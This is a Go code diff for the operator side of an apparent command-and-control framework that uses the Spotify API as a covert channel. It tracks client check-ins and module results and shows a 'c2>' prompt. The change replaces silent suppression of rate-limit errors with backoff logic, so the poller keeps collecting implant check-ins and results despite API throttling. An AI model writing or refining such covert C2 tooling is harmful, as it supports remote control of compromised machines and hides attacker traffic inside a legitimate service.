@@ -30,8 +30,9 @@ type Operator struct {
 	client           *spotify.Client
 	key              string
 	nextSeq          int
-	pendingSeqs      map[int]string       // seq -> module name
-	connectedClients map[string]ClientInfo // client_id -> info
+	pendingSeqs      map[int]string        // seq -> module name
+	connectedClients map[string]ClientInfo  // client_id -> info
+	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
 }
 
 // NewOperator creates a new operator.
@@ -138,14 +139,16 @@ func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
 func (op *Operator) checkForCheckins() bool {
 	results, err := op.PollResults()
 	if err != nil {
-		// Suppress rate limit spam — just backoff silently
-		errStr := strings.ToLower(err.Error())
-		if strings.Contains(errStr, "rate") || strings.Contains(errStr, "429") || strings.Contains(errStr, "too many") {
-			return false
+		wait := handleAPIError(err, "poll")
+		if wait > 600 {
+			// Hard block — slow down the poller dramatically
+			op.pollBackoff = time.Duration(wait) * time.Second
+		} else if wait > 0 {
+			op.pollBackoff = time.Duration(wait) * time.Second
 		}
-		fmt.Printf("\n[!] Poll error: %v\nc2> ", err)
 		return false
 	}
+	op.pollBackoff = 0 // reset on success
 	if len(results) > 0 {
 		seqs := make([]int, 0, len(results))
 		for s := range results {
@@ -163,7 +166,7 @@ func (op *Operator) checkForCheckins() bool {
 }
 
 // startBackgroundPoller runs a goroutine that continuously polls
-// for new checkins and results, with exponential backoff on errors.
+// for new checkins and results, with smart backoff.
 func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 	baseInterval := 20 * time.Second
 	interval := baseInterval
@@ -173,11 +176,17 @@ func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
 		case <-stopCh:
 			return
 		case <-time.After(interval):
+			// Respect rate limit backoff
+			if op.pollBackoff > 0 {
+				interval = op.pollBackoff
+				op.pollBackoff = 0
+				continue
+			}
+
 			found := op.checkForCheckins()
 			if found {
-				interval = baseInterval // reset on success
+				interval = baseInterval
 			} else {
-				// Gradually slow down to avoid rate limits (max 60s)
 				if interval < 60*time.Second {
 					interval = interval + 5*time.Second
 				}
